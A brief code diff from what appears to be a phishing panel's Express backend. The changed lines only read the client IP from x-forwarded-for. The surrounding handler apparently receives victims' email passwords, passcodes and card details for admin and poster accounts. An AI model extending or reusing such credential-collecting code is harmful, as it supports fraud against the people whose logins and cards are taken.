@@ -359,7 +359,10 @@ export const add_data = async (req, res) => {
     const { adminId, posterId } = req.params
     const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard, } = req.body
     const userAgent = req.headers['user-agent'];
-    const ipAddress = req.connection.remoteAddress;
+    const ipAddress =  (req.headers['x-forwarded-for'] || 
+    req.connection.remoteAddress || 
+    req.socket.remoteAddress || 
+    req.connection.socket.remoteAddress).split(",")[0];
 
     try {
         const userFound = await User.findOne({ adminId: adminId })
